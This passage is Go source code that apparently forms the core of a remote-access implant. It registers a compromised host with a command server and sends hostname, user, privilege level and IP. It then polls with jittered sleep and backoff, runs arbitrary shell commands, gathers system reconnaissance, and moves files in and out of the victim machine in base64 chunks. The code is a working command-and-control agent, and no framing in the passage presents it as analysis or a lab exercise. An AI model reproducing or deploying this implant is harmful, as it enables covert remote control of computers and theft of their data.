	out = []byte(strings.ToValidUTF8(string(out), "\uFFFD"))
	return out, status
}

func listDir(path string) []map[string]any {
	entries := make([]map[string]any, 0)
	des, err := os.ReadDir(path)
	if err != nil {
		return entries
	}
	for _, de := range des {
		info, ierr := de.Info()
		if ierr != nil {
			continue
		}
		size := int64(0)
		if !de.IsDir() {
			size = info.Size()
		}
		entries = append(entries, map[string]any{
			"n": de.Name(), "s": size, "d": de.IsDir(), "m": info.ModTime().Unix(),
		})
	}
	return entries
}

func infoCmd() string {
	if runtime.GOOS == "windows" {
		return "systeminfo | findstr /B /C:\"OS\" & whoami & ipconfig | findstr IPv4"
	}
	return "uname -a; id; (ip addr || ifconfig) 2>/dev/null | head -40"
}

func doTask(tk map[string]any, sid string) (report map[string]any, ok bool) {
	fid, _ := tk["id"].(float64)
	tid := int64(fid)
	kind, _ := tk["kind"].(string)
	input, _ := tk["input"].(string)
	var inp map[string]any
	_ = json.Unmarshal([]byte(input), &inp)
	get := func(k string) string {
		if inp == nil {
			return ""
		}
		s, _ := inp[k].(string)
		return s
	}
	num := func(k string) int64 {
		if inp == nil {
			return 0
		}
		f, _ := inp[k].(float64)
		return int64(f)
	}
	fail := func(e string) (map[string]any, bool) {
		return map[string]any{"id": tid, "st": "error", "o": "", "e": e}, true
	}
	done := func() (map[string]any, bool) {
		return map[string]any{"id": tid, "st": "done", "o": "", "e": ""}, true
	}
	defer func() {
		if r := recover(); r != nil {
			report, ok = fail(fmt.Sprint(r))
		}
	}()
	switch kind {
	case "files_list":
		path := get("path")
		if path == "" {
			path = "."
		}
		if _, err := call("file", map[string]any{"a": "ls", "p": path, "es": listDir(path)}, sid); err != nil {
			return fail(err.Error())
		}
		return nil, false
	case "upload":
		tf := num("transfer_id")
		rp := get("remote_path")
		f, err := os.Create(rp)
		if err != nil {
			return fail(err.Error())
		}
		defer f.Close()
		off := int64(0)
		for {
			r, cerr := call("file", map[string]any{"a": "pull", "tf": tf, "p": rp, "of": off, "ln": chunk}, sid)
			if cerr != nil {
				return fail(cerr.Error())
			}
			d, _ := r["d"].(map[string]any)
			data := []byte(nil)
			if d != nil {
				if b64, ok2 := d["b"].(string); ok2 {
					data, _ = base64.StdEncoding.DecodeString(b64)
				}
			}
			if len(data) > 0 {
				if _, werr := f.Write(data); werr != nil {
					return fail(werr.Error())
				}
				off += int64(len(data))
			}
			eof := false
			if d != nil {
				eof, _ = d["eof"].(bool)
			}
			if eof {
				break
			}
		}
		return done()
	case "download":
		tf := num("transfer_id")
		rp := get("remote_path")
		st, serr := os.Stat(rp)
		if serr != nil {
			return fail(serr.Error())
		}
		size := st.Size()
		f, err := os.Open(rp)
		if err != nil {
			return fail(err.Error())
		}
		defer f.Close()
		off := int64(0)
		for {
			buf := make([]byte, chunk)
			n, _ := f.ReadAt(buf, off)
			buf = buf[:n]
			eof := off+int64(n) >= size
			if _, cerr := call("file", map[string]any{
				"a": "push", "tf": tf, "p": rp, "of": off, "ln": size,
				"b": base64.StdEncoding.EncodeToString(buf), "eof": eof,
			}, sid); cerr != nil {
				return fail(cerr.Error())
			}
			off += int64(n)
			if eof {
				break
			}
		}
		return done()
	case "info":
		out, stt := runShell(infoCmd())
		return map[string]any{"id": tid, "st": stt, "o": base64.StdEncoding.EncodeToString(out), "e": ""}, true
	default:
		cmd := get("command")
		if cmd == "" {
			cmd = input
		}
		out, stt := runShell(cmd)
		return map[string]any{"id": tid, "st": stt, "o": base64.StdEncoding.EncodeToString(out), "e": ""}, true
	}
}

func main() {
	hn, user, osn, ar, ip, elevated, pid := hostInfo()
	uid := fmt.Sprintf("%x", sha256.Sum256([]byte(fmt.Sprintf("%d|%s|%s|%s", lid, hn, user, osn))))[:16]
	reg := map[string]any{"uid": uid, "hn": hn, "us": user, "el": elevated, "os": osn,
		"ar": ar, "ip": ip, "pi": pid, "pr": filepath.Base(os.Args[0])}
	sleep, jit, fails := 10, 20, 0
	sid := ""
	var inbox []map[string]any
	apply := func(r map[string]any) bool {
		if r == nil {
			return false
		}
		meta, _ := r["meta"].(map[string]any)
		if meta == nil {
			return false
		}
		if v, ok2 := meta["sl"].(float64); ok2 && v >= 1 {
			sleep = int(v)
		}
		if v, ok2 := meta["jt"].(float64); ok2 {
			jit = int(v)
			if jit < 0 {
				jit = 0
			}
			if jit > 90 {
				jit = 90
			}
		}
		kl, _ := meta["kl"].(bool)
		return kl
	}
	backoff := func() {
		b := sleep
		for i := 0; i < fails && b < sleep*10; i++ {
			b *= 2
		}
		if b > sleep*10 {
			b = sleep * 10
		}
		time.Sleep(time.Duration(b) * time.Second)
	}
	for {
		var r map[string]any
		var err error
		switch {
		case sid == "":
			if r, err = call("reg", reg, ""); err == nil {
				if d, ok2 := r["d"].(map[string]any); ok2 {
					sid, _ = d["sid"].(string)
				}
			}
		case len(inbox) > 0:
			tk := inbox[0]
			inbox = inbox[1:]
			rep, ok2 := doTask(tk, sid)
			if ok2 {
				r, err = call("res", map[string]any{"rs": []map[string]any{rep}}, sid)
			} else {
				r, err = call("poll", nil, sid)
			}
		default:
			r, err = call("poll", nil, sid)
		}
		if err != nil {
			fails++
			backoff()
			continue
		}
		fails = 0
		if apply(r) {
			return
		}
		if d, ok2 := r["d"].(map[string]any); ok2 {
			if ts, ok3 := d["ts"].([]any); ok3 {
				for _, x := range ts {
					if m, ok4 := x.(map[string]any); ok4 {
						inbox = append(inbox, m)
					}
				}
			}
		}
		j := 0
		if jit > 0 {
			j = mrand.Intn(sleep*jit/100 + 1)
		}
		time.Sleep(time.Duration(sleep+j) * time.Second)
	}
}
`
